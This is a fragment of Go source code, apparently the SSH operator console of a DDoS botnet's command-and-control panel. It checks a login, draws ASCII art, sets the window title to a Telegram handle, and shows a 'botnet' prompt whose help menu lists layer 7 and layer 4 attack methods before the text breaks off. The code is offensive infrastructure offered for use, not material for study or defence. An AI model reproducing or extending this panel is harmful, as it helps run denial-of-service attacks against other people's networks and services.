func handleSession(s ssh.Session) {

    term := terminal.NewTerminal(s, "")

    term.Write([]byte("\x1b[H\x1b[2J")); //clear screen

    term.Write([]byte(""))
    term.Write([]byte("\x1b[94musername\x1b[0m: "))
    username, _ := term.ReadLine()

    term.Write([]byte("\x1b[94mpassword\x1b[0m: "))
    password, _ := term.ReadPassword("")

    if isValidCredentials(username, string(password)) {

        fmt.Println(username + " logged in.");

        term.Write([]byte("\x1b[H\x1b[2J")); //clear screen

        term.SetSize(42, 19)

        term.Write([]byte(fmt.Sprintf("\033]0;t.me/thisisbrrt | <3\007"))) // Set window  title

        term.Write([]byte("\n"))
        term.Write([]byte("      zZ    |\\      _,,,---,,_     \n"))
        term.Write([]byte("        Zzz/,`.-'`'    -.  ;-;;,_  \n"))
        term.Write([]byte("          |,4-  ) )-,_. ,\\ (  `'-'\n"))
        term.Write([]byte("          '---''(_/--'  `-'\\_)     \n\n"))

        greeting := fmt.Sprintf("         Good morning \x1B[38;5;140m%s\x1b[0m.", username);
        term.Write([]byte(greeting));

        prompt := fmt.Sprintf("\x1B[48;5;235m\x1B[38;5;140m %s ● botnet \x1B[0m ~ $ ", username)

        for {

            term.Write([]byte("\n\n" + prompt));

            cmd, err := term.ReadLine()
            if err != nil {
                break
            }

            runCommand(cmd, term)

        }
    } else {

        term.Write([]byte("\nInvalid username or password."))
        term.ReadLine()

    }

    s.Close()

}

func runCommand(cmd string, term *terminal.Terminal) {

    term.Write([]byte("\x1b[H\x1b[2J\n")); // clear screen

    switch cmd {
    case "help":
        term.Write([]byte(`Help:
help - Displays the help menu
l7 - Display layer 7 methods
l4 - Display layer 4 methods
